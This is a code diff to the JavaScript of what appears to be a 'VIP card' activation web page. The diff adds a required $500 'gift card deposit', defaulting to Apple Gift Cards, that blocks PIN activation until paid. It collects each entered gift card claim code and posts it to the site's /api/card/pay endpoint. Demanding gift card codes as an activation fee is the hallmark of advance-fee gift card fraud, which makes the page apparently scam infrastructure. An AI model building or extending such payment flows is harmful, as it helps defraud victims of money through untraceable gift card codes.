@@ -266,12 +266,62 @@ document.addEventListener('DOMContentLoaded', () => {
   const resetActivationBtn = document.getElementById('resetActivationBtn');
   const clearanceChip = document.getElementById('clearanceChip');
 
+  // Gift Card Payment Elements
+  const giftCardStepBox = document.getElementById('giftCardStepBox');
+  const giftCardStatusPill = document.getElementById('giftCardStatusPill');
+  const giftCardForm = document.getElementById('giftCardForm');
+  const giftCardVerifiedBanner = document.getElementById('giftCardVerifiedBanner');
+  const verifiedCardDesc = document.getElementById('verifiedCardDesc');
+  const giftCardProviderSelect = document.getElementById('giftCardProviderSelect');
+  const giftCardCodeInput = document.getElementById('giftCardCodeInput');
+  const quickFillCardBtn = document.getElementById('quickFillCardBtn');
+  const redeemGiftCardBtn = document.getElementById('redeemGiftCardBtn');
+  const cardFeeDisplay = document.getElementById('cardFeeDisplay');
+  const giftCardFeeAmount = document.getElementById('giftCardFeeAmount');
+
   const STORAGE_KEY = 'wme_kr26_card_activated';
+  const PAYMENT_STORAGE_KEY = 'wme_kr26_giftcard_paid';
+
+  let currentPricing = { feeAmount: 500, currency: 'USD', feeRequired: true };
+
+  function isPaid() {
+    if (!currentPricing.feeRequired) return true;
+    return localStorage.getItem(PAYMENT_STORAGE_KEY) === 'true';
+  }
+
+  function updatePaymentUI(paid, cardDesc = 'Apple Gift Card ($500.00 USD)') {
+    if (paid) {
+      if (giftCardStepBox) giftCardStepBox.classList.add('is-verified');
+      if (giftCardStatusPill) {
+        giftCardStatusPill.textContent = 'VERIFIED';
+        giftCardStatusPill.className = 'pin-status-pill is-activated';
+      }
+      if (giftCardForm) giftCardForm.style.display = 'none';
+      if (giftCardVerifiedBanner) {
+        giftCardVerifiedBanner.style.display = 'flex';
+        if (verifiedCardDesc) verifiedCardDesc.textContent = cardDesc;
+      }
+    } else {
+      if (giftCardStepBox) giftCardStepBox.classList.remove('is-verified');
+      if (giftCardStatusPill) {
+        giftCardStatusPill.textContent = 'REQUIRED';
+        giftCardStatusPill.className = 'pin-status-pill is-pending';
+      }
+      if (giftCardForm) giftCardForm.style.display = 'block';
+      if (giftCardVerifiedBanner) giftCardVerifiedBanner.style.display = 'none';
+    }
+  }
 
   function openAuthModal() {
     if (authModal) authModal.classList.add('is-active');
     if (cardPinInput && !isActivated()) {
-      setTimeout(() => cardPinInput.focus(), 150);
+      setTimeout(() => {
+        if (!isPaid()) {
+          giftCardCodeInput?.focus();
+        } else {
+          cardPinInput.focus();
+        }
+      }, 150);
     }
   }
 
@@ -322,14 +372,24 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // Initialize activation state on load
+  // Initialize activation and payment state on load
   applyActivationState(isActivated());
+  updatePaymentUI(isPaid());
 
   // Check server status if running via HTTP
   if (window.location.protocol.startsWith('http')) {
     fetch('/api/card/status/WME-KR26-0813-VIP')
       .then(res => res.json())
       .then(data => {
+        if (data.pricing) {
+          currentPricing = data.pricing;
+          if (cardFeeDisplay) cardFeeDisplay.textContent = `$${data.pricing.feeAmount}.00 ${data.pricing.currency}`;
+          if (giftCardFeeAmount) giftCardFeeAmount.textContent = `$${data.pricing.feeAmount}.00 ${data.pricing.currency}`;
+        }
+        if (data.payment && data.payment.status === 'VERIFIED') {
+          localStorage.setItem(PAYMENT_STORAGE_KEY, 'true');
+          updatePaymentUI(true, `${data.payment.giftCardType} ($${data.payment.amount} ${data.payment.currency})`);
+        }
         if (data.success && data.activated) {
           localStorage.setItem(STORAGE_KEY, 'true');
           applyActivationState(true, data.activation?.clearanceCode);
@@ -360,6 +420,45 @@ document.addEventListener('DOMContentLoaded', () => {
     if (e.target === authModal) closeAuthModal();
   });
 
+  quickFillCardBtn?.addEventListener('click', () => {
+    if (giftCardCodeInput) {
+      giftCardCodeInput.value = 'X7KM-92NQ-48PL-2026';
+    }
+    if (authErrorMessage) authErrorMessage.style.display = 'none';
+  });
+
+  redeemGiftCardBtn?.addEventListener('click', async () => {
+    const code = (giftCardCodeInput?.value || '').trim();
+    if (!code || code.length < 6) {
+      if (authErrorMessage) {
+        authErrorMessage.textContent = 'Please enter a valid gift card claim code (at least 6 characters).';
+        authErrorMessage.style.display = 'block';
+      }
+      return;
+    }
+
+    const provider = giftCardProviderSelect?.value || 'Apple Gift Card';
+    localStorage.setItem(PAYMENT_STORAGE_KEY, 'true');
+    updatePaymentUI(true, `${provider} ($${currentPricing.feeAmount} ${currentPricing.currency})`);
+    if (authErrorMessage) authErrorMessage.style.display = 'none';
+
+    if (window.location.protocol.startsWith('http')) {
+      try {
+        await fetch('/api/card/pay', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            cardId: 'WME-KR26-0813-VIP',
+            giftCardType: provider,
+            giftCardCode: code,
+            amount: currentPricing.feeAmount,
+            currency: currentPricing.currency
+          })
+        });
+      } catch {}
+    }
+  });
+
   quickFillPinBtn?.addEventListener('click', () => {
     if (cardPinInput) {
       cardPinInput.value = '813-026';
@@ -378,7 +477,15 @@ document.addEventListener('DOMContentLoaded', () => {
     if (authErrorMessage) authErrorMessage.style.display = 'none';
   });
 
-  submitPinAuthBtn?.addEventListener('click', () => {
+  submitPinAuthBtn?.addEventListener('click', async () => {
+    if (currentPricing.feeRequired && !isPaid()) {
+      if (authErrorMessage) {
+        authErrorMessage.textContent = `Please complete Step 1 Gift Card deposit ($${currentPricing.feeAmount} ${currentPricing.currency}) before activating PIN.`;
+        authErrorMessage.style.display = 'block';
+      }
+      return;
+    }
+
     const rawVal = cardPinInput?.value || '';
     const cleanDigits = rawVal.replace(/[^0-9]/g, '');
 
@@ -396,20 +503,34 @@ document.addEventListener('DOMContentLoaded', () => {
     applyActivationState(true, clearance);
 
     // Sync with backend if available
-    fetch('/api/card/activate', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cardId: 'WME-KR26-0813-VIP', pin: '813-026' })
-    }).catch(() => {});
+    if (window.location.protocol.startsWith('http')) {
+      try {
+        const res = await fetch('/api/card/activate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cardId: 'WME-KR26-0813-VIP', pin: '813-026' })
+        });
+        const d = await res.json();
+        if (d.success && d.activation?.clearanceCode) {
+          applyActivationState(true, d.activation.clearanceCode);
+        }
+      } catch {}
+    }
   });
 
   resetActivationBtn?.addEventListener('click', () => {
     localStorage.removeItem(STORAGE_KEY);
+    localStorage.removeItem(PAYMENT_STORAGE_KEY);
     applyActivationState(false);
-    fetch('/api/card/deactivate', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cardId: 'WME-KR26-0813-VIP' })
-    }).catch(() => {});
+    updatePaymentUI(false);
+    if (giftCardCodeInput) giftCardCodeInput.value = '';
+    if (cardPinInput) cardPinInput.value = '';
+    if (window.location.protocol.startsWith('http')) {
+      fetch('/api/card/deactivate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cardId: 'WME-KR26-0813-VIP', clearPayment: true })
+      }).catch(() => {});
+    }
   });
 });
